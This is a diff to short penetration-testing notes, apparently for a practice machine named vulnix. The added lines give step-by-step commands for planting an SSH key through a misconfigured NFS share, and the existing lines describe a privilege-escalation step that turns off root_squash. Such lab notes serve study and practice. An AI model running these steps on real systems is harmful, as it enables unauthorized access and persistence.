@@ -13,3 +13,16 @@ privesc
 	su vulnix
 sudoedit /etc/exports
 	editing the root_squash option to *(rw,no_root_squash) removes restrictions on filesystem traversal
+	
+	
+#nfspysh mount share then mkdir .ssh
+nfspysh -o server=192.168.0.20:/home/user
+mkdir .ssh
+cd .ssh	
+ssh-keygen
+cp id_rsa.pub /tmp/authorized_keys
+put /tmp/authorized_keys
+exit
+SSH_AUTH_SOCK=0 ssh uname@192.168.1.111
+
+
